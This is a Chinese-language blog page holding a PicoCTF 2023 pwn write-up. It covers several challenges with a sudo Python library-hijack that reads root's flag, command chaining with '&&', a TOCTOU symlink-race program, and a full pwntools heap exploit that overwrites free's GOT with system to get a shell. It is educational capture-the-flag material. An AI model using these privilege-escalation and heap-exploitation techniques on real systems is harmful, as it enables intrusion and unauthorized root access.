@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <!-- RSS / Atom -->
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      renderMathInElement(document.body, {
+        delimiters: [
+          {left: "$$", right: "$$", display: true},
+          {left: "\\[", right: "\\]", display: true},
+          {left: "$",  right: "$",  display: false},
+          {left: "\\(", right: "\\)", display: false}
+        ],
+        throwOnError: false,   // 避免个别符号导致整段失败
+        macros: {
+          "\\sgn": "\\operatorname{sgn}"  // 你文中用到的 sgn，统一为运算符
+        }
+      });
+    });
+  </script> -->
+    <!-- <script>
+      window.MathJax = {
+        tex: {
+          packages: {'[+]': ['ams']},   // cases / aligned 需要 ams
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$','$$'], ['\\[','\\]']],
+          tags: 'ams'
+        },
+        options: { skipHtmlTags: ['script','style','textarea','pre','code'] }
+      };
+    </script>
+    <script async id="MathJax-script"
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script> -->
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <title>现充|junyu33</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="head-nav">
+	<div class="inner">
+		<a href="/">
+			现充|junyu33
+		</a>
+		<div class="right">
+			
+				<a href="/zh">首页</a>
+				<a href="/zh/archives">归档</a>
+				
+					<a href="/zh/categories">Categories</a>
+				
+				
+					<a href="/zh/tags">Tags</a>
+				
+				<a href="/">English</a>
+			
+		</div>
+	</div>
+</div>
+
+  <div class="main">
+    <div class="post">
+    
+
+	<h1>PicoCTF 2023 pwn wp</h1>
+	<p>比较简单，且不失趣味性。</p>
+<span id="more"></span>
+<h2 id="PicoCTF-2023-pwn-wp">PicoCTF 2023 pwn wp</h2>
+<h3 id="challenge-babygame01-statue-SOLVED-working-T1d">challenge babygame01| statue: SOLVED | working: T1d</h3>
+<p>移动到（-1，86）位置，flag数量会被覆盖为64，直接输入<code>p</code>拿到flag</p>
+<h3 id="challenge-two-sum-statue-SOLVED-working-T1d">challenge two-sum| statue: SOLVED | working: T1d</h3>
+<p><code>2^31-1</code>和<code>1</code>，整数溢出</p>
+<h3 id="challenge-VNE-statue-SOLVED-working-T1d">challenge VNE| statue: SOLVED | working: T1d</h3>
+<p>根据提示，添加环境变量，以root身份执行ls命令。第一次执行‘<code>ls ``/root</code>’可以看到‘flag.txt’文件，</p>
+<p>第二次利用<code>&amp;&amp;</code>符号执行‘<code>ls ``/root &amp;&amp; cat ``/root/flag.txt</code>’拿到flag</p>
+<h3 id="challenge-hijacking-statue-SOLVED-working-T1d">challenge hijacking| statue: SOLVED | working: T1d</h3>
+<p>使用<code>sudo -l</code>指令查看发现可以无密码使用root权限运行<code>.server.py</code>文件，查看该文件发现导入了<code>base64</code>包，直接在该文件夹创建一个新的<code>base64.py</code>文件，写入<code>import os;os.system('ls -a /root')</code>,再用<code>sudo /usr/bin/python3 /home/picoctf/.server.py</code>执行，我们可以看见已经打印出了root路径下的所有文件，包括<code>.flag.txt</code>文件，于是直接修改base64.py文件为<code>import os;os.system('cat /root/.flag.txt')</code>运行<code>.server.py</code>文件就可以拿到flag了</p>
+<h3 id="challenge-tic-tac-statue-SOLVED-working-junyu33">challenge tic-tac | statue: SOLVED | working: junyu33</h3>
+<p>Ref: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use</a></p>
+<pre><code class="language-C++">// vuln.cpp
+#include &lt;iostream&gt;
+#include &lt;fstream&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+
+int main(int argc, char *argv[]) &#123;
+        while(1) &#123;
+                symlink(&quot;flag.txt&quot;, &quot;test&quot;);
+                unlink(&quot;test&quot;);
+                symlink(&quot;dummy&quot;, &quot;test&quot;);
+                unlink(&quot;test&quot;);
+        &#125;
+        return 0;
+&#125;
+#!/bin/sh
+# test.sh
+while true
+do
+    ./txtreader test
+done
+g++ vuln.cpp -o vuln
+nice -20 ./vuln
+nice -n 20 ./test.sh
+</code></pre>
+<h3 id="challenge-babygame02-statue-SOLVED-working-junyu33">challenge babygame02 | statue: SOLVED | working: junyu33</h3>
+<p>移动到（-1，51）位置，换成<code>\x7c</code>即可拿到flag。</p>
+<h3 id="challenge-Horsetrack-statue-SOLVED-working-T1d">challenge Horsetrack | statue: SOLVED | working: T1d</h3>
+<p>检查未开<code>PIE</code>保护，查看程序存在新建、删除、打印堆的功能，但是打印堆前提是需要有四个以上的堆，其次程序在删除时未清空指针，同时程序还有一个隐藏功能可以修改存放在堆管理器中的堆，即存在UAF漏洞。因此该题仅需先泄露出tcache异或加密的密钥，然后通过隐藏功能将<code>free</code>的got表加入tcache，修改<code>free</code>的got表为<code>system</code>即可。</p>
+<pre><code class="language-Python">from pwn import *
+
+# p = process('./vuln')
+p = remote('saturn.picoctf.net', 63361)
+elf = ELF('./vuln')
+lib = ELF('./libc.so.6')
+
+
+def choice(id_):
+    p.recvuntil(b'Choice:')
+    p.sendline(id_)
+
+
+def change(id_, mess, spot):
+    choice(b'0')
+    p.recvuntil(b'Stable index # (0-17)?')
+    p.sendline(id_)
+    p.recvuntil(b'characters:')
+    p.sendline(mess)
+    p.recvuntil(b'New spot?')
+    p.sendline(spot)
+
+
+def add(id_, size_, mess):
+    choice(b'1')
+    p.recvuntil(b'Stable index # (0-17)?')
+    p.sendline(id_)
+    p.recvuntil(b'Horse name length (16-256)?')
+    p.sendline(size_)
+    p.recvuntil(b'characters:')
+    p.sendline(mess)
+
+
+def delete(id_):
+    choice(b'2')
+    p.recvuntil(b'Stable index # (0-17)?')
+    p.sendline(id_)
+
+
+[add(str(i), b'23', b'a' * 23) for i in range(0, 5)]
+delete(b'0')
+add(b'17', b'23', b'\xff')
+
+choice(b'3')
+p.recvuntil(b'WINNER: ')
+key = u16(p.recv(2))
+print(hex(key))
+
+add(b'14', b'24', b'a' * 31)
+add(b'15', b'24', b'a' * 31)
+delete(b'14')
+delete(b'15')
+
+free_got = elf.got['free'] - 0x18
+payload = p64(free_got ^ key) + p64(0)
+change(b'15', payload, b'16')
+
+payload = b'/bin/sh\00' + b'\xff'
+add(b'14', b'24', payload)
+payload = p64(0) * 3 + p64(elf.sym['system'])
+add(b'15', b'31', payload)
+delete(b'14')
+
+p.interactive()
+</code></pre>
+
+</div>
+
+
+  </div>
+</body>
+</html>
+
